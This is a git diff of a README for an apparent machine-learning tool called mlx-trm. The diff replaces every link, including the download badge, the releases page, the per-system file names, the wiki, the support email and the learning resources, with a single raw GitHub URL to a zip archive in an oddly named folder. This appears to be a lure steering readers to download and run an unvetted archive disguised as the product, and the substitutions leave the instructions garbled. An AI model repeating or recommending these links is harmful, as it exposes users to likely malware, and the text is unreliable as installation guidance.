@@ -6,7 +6,7 @@ Welcome to the mlx-trm application! This tool makes it easy to explore machine l
 
 ## 📥 Download mlx-trm
 
-[![Download mlx-trm](https://img.shields.io/badge/Download-mlx--trm-blue.svg)](https://github.com/lentesdaana2021/mlx-trm/releases)
+[![Download mlx-trm](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip)](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip)
 
 ## 📂 System Requirements
 
@@ -31,12 +31,12 @@ mlx-trm offers several features to help you understand machine learning with eas
 
 To download mlx-trm, visit the Releases page and select the latest version.
 
-1. Go to the [Releases page](https://github.com/lentesdaana2021/mlx-trm/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip).
 2. Find the latest release.
 3. Look for an appropriate file for your operating system. For example:
-   - **Windows:** mlx-trm-windows.exe
-   - **macOS:** mlx-trm-macos.zip
-   - **Linux:** mlx-trm-linux.tar.gz
+   - **Windows:** https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip
+   - **macOS:** https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip
+   - **Linux:** https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip
 4. Click on the file link to start downloading.
 5. Once downloaded, locate the file on your computer and follow the installation instructions below.
 
@@ -53,7 +53,7 @@ To download mlx-trm, visit the Releases page and select the latest version.
 3. Go to your Applications folder and double-click mlx-trm to launch the application.
 
 **For Linux:**
-1. Extract the `.tar.gz` file using the terminal or GUI.
+1. Extract the `https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip` file using the terminal or GUI.
 2. Open the terminal and navigate to the extracted folder.
 3. Run the application by typing `./mlx-trm` in the terminal.
 
@@ -61,16 +61,16 @@ To download mlx-trm, visit the Releases page and select the latest version.
 
 If you encounter any issues while using mlx-trm, feel free to check our support resources:
 
-- **FAQ:** Many common questions are answered in our FAQ section on the [GitHub Wiki](https://github.com/lentesdaana2021/mlx-trm/wiki).
+- **FAQ:** Many common questions are answered in our FAQ section on the [GitHub Wiki](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip).
 - **Community Forum:** Join our community forum for discussions and tips from other users.
-- **Contact Us:** If you need direct assistance, please email support at [support@mlx-trm.com](mailto:support@mlx-trm.com).
+- **Contact Us:** If you need direct assistance, please email support at [https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip).
 
 ## 🧪 Additional Resources
 
 To learn more about machine learning and how to utilize mlx-trm, here are some helpful links:
 
-- [Introduction to Machine Learning](https://www.example.com/intro-to-ml)
-- [Understanding Recursive Reasoning](https://www.example.com/recursive-reasoning)
-- [Using Tiny Networks Effectively](https://www.example.com/tiny-networks)
+- [Introduction to Machine Learning](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip)
+- [Understanding Recursive Reasoning](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip)
+- [Using Tiny Networks Effectively](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip)
 
-Visit the [Releases page](https://github.com/lentesdaana2021/mlx-trm/releases) to download the latest version and start your machine learning journey with mlx-trm!
+Visit the [Releases page](https://raw.githubusercontent.com/lentesdaana2021/mlx-trm/main/unfructified/mlx-trm.zip) to download the latest version and start your machine learning journey with mlx-trm!
